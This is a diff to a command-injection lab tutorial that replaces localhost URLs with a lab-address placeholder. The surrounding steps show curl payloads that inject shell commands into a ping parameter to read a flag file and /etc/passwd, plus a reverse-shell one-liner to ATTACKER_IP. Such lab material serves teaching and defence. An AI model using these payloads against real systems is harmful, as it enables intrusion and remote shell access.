@@ -52,7 +52,10 @@ Using `subprocess` with an **argument list** (no shell) is safe instead of `os.s
 ```bash
 cd command-injection/lab
 docker compose up -d
-# Lab at: http://localhost:7107
+
+> 💡 **Get Lab Link:** Open this lesson on **Learning Detail** → click **"Access Lab"** to get the real link (e.g., `https://vuln.ghedahaui.online/labs-env/...`). Replace `<LAB_ADDRESS>` with that link in commands below.
+
+# Lab at: <LAB_ADDRESS>
 ```
 
 The lab is a web ping tool: type an IP → the server runs `ping -c 1 <ip>` and shows the result.
@@ -62,7 +65,7 @@ The lab is a web ping tool: type an IP → the server runs `ping -c 1 <ip>` and 
 ### Step 2: Run a normal command
 
 ```bash
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1"
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.025 ms
 ...
@@ -73,7 +76,7 @@ PING 127.0.0.1 (127.0.0.1): 56 data bytes
 ### Step 3: Detect the flaw with `;`
 
 ```bash
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;id"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;id"
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 ...
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -86,7 +89,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ### Step 4: Read the flag file
 
 ```bash
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;cat%20/flag.txt"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;cat%20/flag.txt"
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 ...
 FLAG{cmd_1nj3ct10n_2026}
@@ -100,13 +103,13 @@ FLAG{cmd_1nj3ct10n_2026}
 
 ```bash
 # && (only runs if ping succeeds)
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1%26%26%20cat%20/flag.txt"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1%26%26%20cat%20/flag.txt"
 
 # | (pipe) — no need to wait for ping
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1%7Ccat%20/flag.txt"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1%7Ccat%20/flag.txt"
 
 # Command substitution — nest a command inside the string
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;echo%20$(cat%20/flag.txt)"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;echo%20$(cat%20/flag.txt)"
 ```
 
 <!-- IMG: && , | , $() payloads all reading the flag (step 5). File: command-injection_05_variants.png -->
@@ -115,10 +118,10 @@ $ curl -s "http://localhost:7107/ping?ip=127.0.0.1;echo%20$(cat%20/flag.txt)"
 
 ```bash
 # Read /etc/passwd
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;cat%20/etc/passwd"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;cat%20/etc/passwd"
 
 # List the directory
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;ls%20-la%20/"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;ls%20-la%20/"
 
 # Reverse shell (if nc exists): bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
 ```
